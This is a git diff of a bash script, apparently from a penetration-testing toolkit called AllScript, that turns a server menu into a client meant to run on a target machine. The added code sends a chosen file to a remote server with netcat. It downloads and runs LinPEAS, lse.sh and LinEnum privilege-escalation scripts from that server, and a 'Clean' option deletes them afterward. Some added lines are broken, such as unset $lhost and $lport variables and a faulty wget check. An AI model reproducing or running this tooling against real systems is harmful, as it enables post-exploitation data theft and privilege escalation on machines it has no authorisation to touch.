@@ -12,7 +12,6 @@ BLUE='\033[0;34m'
 WHITE='\033[1;37m'
 GREEN='\033[1;32m'
 PURP='\033[1;35m'
-deps=('xsel' 'nc' 'python3')
 currServerPath=""
 GIP=""
 echo -e "$BLUE
@@ -27,24 +26,35 @@ echo -e "$BLUE
 d8           a8b  8YaYbbd8aa   88  88              88      aa88  aa8bbdPaY8   aa8bbdP8Y8  aa8bbdPaY8      a8a      
                                                                                                                    
                                                                                                                    
-
-
-$GREEN Welcome To AllScript Macro Tool by Abir Nadav $BLUE
+$GREEN 
+AllScript Client Script $BLUE
 
 Version ---> 1.1 
 GitHub  ---> https://github.com/AbirNadav-dev/AllScript
 _________________________________________________________________________________________________________________
 
-
-
-
+$PURP
 "
+echo "Enter Server IP:"
+read GIP
+down=""
+deps=('wget' 'curl' 'nc')
 
 
+if wget -q --method=HEAD http://$GIP:8000/;
+ then
+  echo -e "$GREEN"
+  echo -e "[FOUND] AllScript Server Detected.
+  
+  "
+ else
+  echo -e "$RED"
+  echo "[ERROR] Cant Find AllScript Server.
+  
+  "
+fi
 
-echo -e "$WHITE"
-echo -e "Testing if you have Tool Dependencies...
-"
+
 
 
 function checkDep (){
@@ -52,29 +62,16 @@ if ! command -v $1 &> /dev/null
 then
     echo -e "$RED"
     echo -e "[WARNING] $1 could not be found $BLUE"
-    echo -e "Trying to install $1 now.$WHITE
-    "
-    sudo apt-get install $1
+    
 else
-    echo -e "$GREEN"
-    echo -e "[FOUND] ----> $1"
+    echo -e "$GREEN[FOUND] ----> $1"
+   [[ $1 -eq wget ]] && down=$1 || echo -e "$RED
+   [WARNING] No Downloader Tool Found!"
 fi
 }
 
 
-for item in ${deps[*]}
-do
-    checkDep $item
-done
 
-
-# Copy To ClipBoard Function
-
-function copyToClip(){
-    echo "$1" | xsel -ib
-}
-
-# Get Python HTTP.server Path
 
 function getServerIP(){
    IP=$(hostname -I | awk '{print $1}')
@@ -88,7 +85,10 @@ function getFileIP(){
     GIP="$IP" 
 }
 
-
+for item in ${deps[*]}
+do
+    checkDep $item
+done
 
 
 
@@ -101,84 +101,52 @@ $GREEN
 
 
 
-
 pwd=$('pwd')
 PS3='
 Please enter your choice: '
-options=("Start AllScript Server" "Open NetCat Listener" "Lin Peas Server" "LinSmartPE Server" "LinEnum Server" "Get File From Target" "Get Client Downloader CMD" "Quit")
+options=("Upload File to Server" "Start LinPeas" "Start LinSmart" "Start LinEnum" "Clean" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
-        "Start AllScript Server")
+        "Upload File to Server")
             echo -e "$PURP"
-            echo -e "AllScript Server Started."
-            python3 -m http.server
+            echo "Enter File Path:"
+            read -e fileName
+            nc -w 3 $GIP 9886 < $fileName
             echo -e "$GREEN "
             ;;
-        "Open NetCat Listener")
+        "Start LinPeas")
             echo -e "$PURP"
-            echo -e "Starting NetCat Listener"
-            echo -e "Insert Listen LPORT"
-            read lport
-            sudo nc -nlvp $lport 
-             echo -e "$GREEN "
-            ;;
-        "Lin Peas Server")
-            echo -e "$PURP"
-            echo -e "you chose choice $REPLY which is $opt"
-            getServerIP
-            path="$currServerPath/linpeas.sh" 
-            copyToClip "$path"
-            python3 -m http.server --directory "$pwd/lib/linPEAS/"
+            wget "http://$lhost:$lport/lib/linPEAS/linpeas.sh"
+            bash linpeas.sh
             echo -e "$GREEN "
             ;;
-        "LinSmartPE Server")
+              "Start LinSmart")
             echo -e "$PURP"
-            echo -e "you chose choice $REPLY which is $opt"
-            getServerIP
-            path="$currServerPath/lse.sh" 
-            copyToClip "$path"
-            python3 -m http.server --directory "$pwd/lib/LSE/"
-            echo -e "$GREEN "
-            ;;  
-        "LinEnum Server")
-            echo -e "$PURP"
-            echo -e "you chose choice $REPLY which is $opt"
-            getServerIP
-            path="$currServerPath/LinEnum.sh" 
-            copyToClip "$path"
-            python3 -m http.server --directory "$pwd/lib/linEnum/"
-            echo -e "$GREEN "
-            ;; 
-        "Get File From Target")
-            echo -e "$PURP"
-            echo -e "you chose choice $REPLY which is $opt"
-            echo -e "Choose Output Filename:"
-            read -e outputFile
-            getFileIP
-            command="nc -w 3 $GIP 9886 < filename"
-            copyToClip "$command"
-            echo "Command Copied to Clipboard! Or use AllClient"
-            nc -l -p 9886 > "$outputFile"
-            echo -e "$RED"
-            echo -e "File Saved as: $outputFile"
+            wget "http://$lhost:$lport/lib/LSE/lse.sh"
+            bash lse.sh
             echo -e "$GREEN "
             ;;
-             "Get Client Downloader CMD")
+              "Start LinEnum")
             echo -e "$PURP"
-            echo -e "you chose choice $REPLY which is $opt"
-            getFileIP
-            command="wget http://$GIP:8000/AllClient.sh "
-            copyToClip "$command"
-            python3 -m http.server
+            wget "http://$lhost:$lport/lib/linEnum/LinEnum.sh"
+            bash LinEnum.sh
             echo -e "$GREEN "
-            ;;  
-        "
-        Quit")
-            echo "Good Bye, Im waiting at: $pwd"
+            ;;
+            "Clean")
+            echo -e "$PURP"
+            echo "Cleaning Files"
+            rm LinEnum.sh
+            rm lse.sh
+            rm linpeas.sh
+            echo -e "$GREEN "
+            ;;
+        "Quit")
+        echo "Good Bye, Im waiting at: $pwd"
             break
             ;;
         *) echo echo -e "$RED invalid option $REPLY";;
     esac
 done
+
 
